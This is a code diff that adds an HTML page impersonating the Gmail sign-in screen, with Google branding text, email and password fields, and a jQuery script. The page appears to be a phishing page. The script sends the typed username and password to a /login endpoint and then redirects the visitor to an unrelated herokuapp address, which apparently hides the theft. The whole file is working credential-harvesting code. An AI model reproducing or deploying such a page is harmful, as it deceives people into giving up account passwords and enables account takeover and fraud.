@@ -1,0 +1,122 @@
+<html>
+​
+<head>
+    <!-- Bootstrap and jQuery -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+​
+    <!-- Sweet Alert -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/8.11.8/sweetalert2.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/8.11.8/sweetalert2.min.css">
+​
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300' rel='stylesheet' type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300' rel='stylesheet' type='text/css'>
+    <title>Gmail login</title>
+​
+    <style>
+        p,
+        h1,
+        h4 {
+            color: #555557;
+            font-family: 'Open Sans', sans-serif;
+        }
+​
+        .form-input {
+            border: solid 1px #c2c4c6;
+            font-size: 16px;
+            padding: 0.2em;
+        }
+​
+        .submit-btn {
+            background: #498af2;
+            font-family: verdana;
+            font-size: 14px;
+            color: white;
+            border-radius: 5px 5px 5px 5px;
+            border-width: 1px;
+            border-style: solid;
+            border-color: gray;
+            cursor: pointer;
+            outline: none;
+            width: 90%;
+            height: 3em;
+        }
+    </style>
+</head>
+​
+<body>
+    <div>
+        <div class="row">
+            <div class="col-sm-12 col-md-12 col-lg-12 p-3 text-center">
+                <img src="/static/images/logo.png" width="118" height="38" />
+            </div>
+            <div class="col-sm-12 col-md-12 col-lg-12 text-center">
+                <h1>One Account. All of Google.</h1>
+            </div>
+            <div class="col-sm-12 col-md-12 col-lg-12 text-center mt-3">
+                <h4>Sign in to continue to Gmail</h4>
+            </div>
+            <div class="col-sm-12 col-md-4 col-lg-4"></div>
+            <div class="col-sm-12 col-md-4 col-lg-4 pl-5 pr-5 mt-5">
+                <div class="pl-5 pr-5">
+                    <div style="background: #f7f7f7; box-shadow: 0px 0px 1px 1px #c6c1c1;" class="p-5">
+                        <div class="row">
+                            <div class="col-sm-12 col-md-12 col-lg-12 text-center mb-5">
+                                <img src="/static/images/profile-img.png" width="99" height="99" />
+                            </div>
+                            <div class="col-sm-12 col-md-12 col-lg-12 text-center">
+                                <input placeholder="Email" class="form-input" type="mail" name="email" id="email" />
+                            </div>
+                            <div class="col-sm-12 col-md-12 col-lg-12 text-center mt-2">
+                                <input placeholder="Password" class="form-input" type="password" name="password"
+                                    id="password" />
+                            </div>
+                            <div class="col-sm-12 col-md-12 col-lg-12 text-center mt-4">
+                                <button class="submit-btn">Login</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-sm-12 col-md-4 col-lg-4"></div>
+            <div class="col-sm-12 col-md-12 col-lg-12 text-center mt-5">
+                <p>One Google Account for everything Google</p>
+            </div>
+            <div class="col-sm-12 col-md-12 col-lg-12 text-center">
+                <img src="/static/images/footer-logo.png" id="logo2" />
+            </div>
+        </div>
+    </div>
+    <script>
+        $(function () {
+            $(".submit-btn").click(function () {
+                let data = {
+                    username: $("#email").val(),
+                    password: $("#password").val()
+                }
+                $.ajax({
+                    url: "/login",
+                    type: "post",
+                    data: JSON.stringify(data),
+                    dataType: 'json',
+                    contentType: 'application/json',
+                    success: function (result) {
+                        window.location.href = "https://myvideoapp13thsep.herokuapp.com/4c3e2906-0aed-41d3-a60e-ed8ef1491414"
+                    },
+                    error: function (result) {
+                        $("#loader").hide();
+                        Swal.fire(
+                            'Uh Oh!',
+                            result.responseJSON.message,
+                            'error'
+                        )
+                    }
+                })
+            })
+        })
+    </script>
+</body>
+​
+</html>
